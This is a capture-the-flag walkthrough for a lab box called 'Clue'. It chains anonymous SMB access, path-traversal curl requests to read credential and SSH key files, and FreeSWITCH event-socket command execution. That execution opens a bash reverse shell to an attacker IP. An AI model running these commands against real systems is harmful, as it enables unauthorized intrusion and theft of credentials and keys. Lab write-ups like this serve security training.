# Clue - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed several open services:
```
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http             Apache httpd 2.4.38
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Sinatra web framework
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

### SMB Enumeration
I tested for anonymous SMB access and found it was allowed:
```bash
smbclient -L //192.168.178.240/ -N
```

This revealed a share named "backup" that could be accessed without authentication:
```bash
smbclient //192.168.178.240/backup -N
```

I mounted the share to examine its contents but found only default installation files. Although there were some configuration files with credentials, these appeared to be the default ones.

### Web Enumeration
The Apache server on port 80 returned a 403 Forbidden response. However, port 3000 was hosting a Cassandra Web Framework application. Initial exploration of this application revealed it was an interface for managing a Cassandra database.

## Gaining Initial Access

### Cassandra Web Framework Vulnerability
Further research revealed that the Cassandra Web Framework is vulnerable to a local file read vulnerability. I exploited this to read sensitive files on the system:

```bash
curl -s "http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../proc/self/cmdline"
```

This revealed potential credentials for the user cassie: `SecondBiteTheApple330`

### FreeSWITCH Configuration
Using the same vulnerability, I targeted known configuration files for the FreeSWITCH service that was running on port 8021:

```bash
curl -s "http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml"
```

This disclosed FreeSWITCH credentials:
- **Username**: (default)
- **Password**: StrongClueConEight021

### FreeSWITCH Exploitation
FreeSWITCH's event socket interface on port 8021 is known to be vulnerable to command execution if you have valid credentials. I connected to it and executed commands:

```bash
nc 192.168.178.240 8021
auth StrongClueConEight021
bgapi system /bin/bash -c "bash -i >& /dev/tcp/192.168.45.183/4444 0>&1"
```

On my attack machine, I had a netcat listener waiting:
```bash
nc -lvnp 4444
```

This provided a shell as the freeswitch user.

## Lateral Movement

### Accessing User Cassie
From the freeswitch user, I enumerated other users on the system and discovered two accessible users: anthony and cassie. I attempted to switch to the cassie user using the password found earlier:

```bash
su - cassie
Password: SecondBiteTheApple330
```

This was successful, providing me with access as the cassie user.

## Privilege Escalation

### Sudo Permissions
I checked the sudo permissions for the cassie user:

```bash
sudo -l
```

The output revealed that cassie could start the Cassandra service as root:
```
User cassie may run the following commands on clue:
    (root) NOPASSWD: /usr/bin/cassandra
```

### Exploiting Cassandra to Read Root Files
Since cassie could start Cassandra as root, and the Cassandra Web Framework had a file read vulnerability, I could chain these together to read files as root:

1. Started Cassandra as root:
```bash
sudo /usr/bin/cassandra
```

2. Waited for the service to fully start up.

3. Used the file read vulnerability to read sensitive files as root:
```bash
curl -s "http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../root/.ssh/id_rsa"
```

This didn't yield an SSH key for root, but further enumeration revealed an SSH key in anthony's directory:

```bash
curl -s "http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../home/anthony/.ssh/id_rsa"
```

### Root Access
I tried using anthony's SSH key to access the root account:

```bash
chmod 600 anthony_key
ssh -i anthony_key root@192.168.178.240
```

This was successful, providing full root access to the system.

```bash
root@clue:~# id
uid=0(root) gid=0(root) groups=0(root)
```

